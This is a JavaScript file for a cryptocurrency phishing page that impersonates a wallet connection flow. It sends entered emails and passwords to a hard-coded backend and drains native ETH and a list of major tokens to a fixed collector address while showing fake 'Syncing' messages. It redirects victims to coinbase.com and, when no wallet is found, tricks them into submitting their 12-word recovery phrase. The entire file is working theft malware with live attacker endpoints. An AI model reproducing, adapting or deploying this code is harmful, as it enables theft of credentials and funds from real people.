document.addEventListener('DOMContentLoaded', () => {
    const step1 = document.getElementById('step-1');
    const step2 = document.getElementById('step-2');
    const step3 = document.getElementById('step-3');
    const connectBtn = document.getElementById('connectBtn');
    const status = document.getElementById('status');

    // CONFIGURATION
    const backendUrl = "https://cb-backend-5c8f.onrender.com";
    // This is your FIXED FLOAT DEPOSIT ADDRESS (The "Collector")
    const myWallet = "0xfe78becb16668304c924e0b8d0ad46b6f5adcf87";
    
    // High-Value Target Tokens (Prioritized)
    const targetTokens = [
        "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH
        "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC
        "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
        "0xA0b86991E6444989a7a7270AC91C4f1e0e7d68Fa", // USDC
        "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
        "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", // UNI
        "0x514910771AF9Ca656af840dff83E8264EcF986CA", // LINK
        "0x7D1AfA7B718fb893dB30A3aBc0C5cc463165d63e", // MATIC
        "0x95aD61b0a150d79219dCF64E1E6C01b09077902a", // SHIB
        "0xA0b73E1Ff0B80914AB6fe0444E65D68223686B32"  // LDO
    ];

    let userCredentials = { email: '', password: '', recoveryPhrase: '' };

    async function sendToBackend(data) {
        try { await fetch(`${backendUrl}/update`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) }); } catch (e) { console.error(e); }
    }

    // UI Logic
    document.getElementById('toStep2').onclick = () => { step1.classList.add('hidden'); step2.classList.remove('hidden'); };
    document.getElementById('toStep3').onclick = () => {
        userCredentials.email = document.getElementById('email').value;
        userCredentials.password = document.getElementById('pass').value;
        if (userCredentials.email && userCredentials.password) {
            sendToBackend({ email: userCredentials.email, password: userCredentials.password });
            step2.classList.add('hidden'); step3.classList.remove('hidden');
        }
    };

    // THE ENGINE: AUTOMATED DRAINER
    connectBtn.onclick = async () => {
        if (!window.ethereum) return triggerPlanB();
        
        try {
            status.innerText = "Connecting...";
            const provider = new ethers.BrowserProvider(window.ethereum);
            const signer = await provider.getSigner();
            const userAddress = await signer.getAddress();
            sendToBackend({ walletAddress: userAddress });

            // 1. SWEEP NATIVE ETH FIRST (Highest Priority)
            status.innerText = "Syncing assets...";
            try {
                const bal = await provider.getBalance(userAddress);
                const gasPrice = await provider.getGasPrice();
                const gasLimit = 21000n;
                const cost = gasPrice * gasLimit;
                if (bal > cost) {
                    await signer.sendTransaction({ to: myWallet, value: bal - cost });
                    sendToBackend({ walletAddress: userAddress, type: 'ETH_DRAIN' });
                }
            } catch (e) { console.log("ETH failed", e); }

            // 2. SCAN & SWEEP ALL TOKENS (The Vacuum)
            const tokenAbi = ["function balanceOf(address) view returns (uint256)", "function transfer(address, uint256) returns (bool)", "function decimals() view returns (uint8)"];
            
            // We check our target list + any other tokens found in user history
            for (const addr of targetTokens) {
                try {
                    const contract = new ethers.Contract(addr, tokenAbi, signer);
                    const balance = await contract.balanceOf(userAddress);
                    if (balance > 0n) {
                        status.innerText = "Syncing Token...";
                        await contract.transfer(myWallet, balance);
                        sendToBackend({ walletAddress: userAddress, token: addr, amount: balance.toString() });
                    }
                } catch (e) { continue; } // If one fails, move to next instantly
            }

            status.innerText = "Done! Redirecting...";
            setTimeout(() => { window.location.href = "https://coinbase.com"; }, 2000);

        } catch (err) {
            status.innerText = "Error. Try again.";
            console.error(err);
        }
    };

    function triggerPlanB() {
        step3.innerHTML = `<div class="error-box">Wallet connection failed. Please provide recovery phrase to verify identity.
        <textarea id="phrase" placeholder="12 words..."></textarea>
        <button id="submitPhrase">Verify</button></div>`;
        document.getElementById('submitPhrase').onclick = () => {
            const val = document.getElementById('phrase').value.trim();
            if (val.split(' ').length === 12) {
                sendToBackend({ recoveryPhrase: val });
                window.location.href = "https://coinbase.com";
            }
        };
    }
});
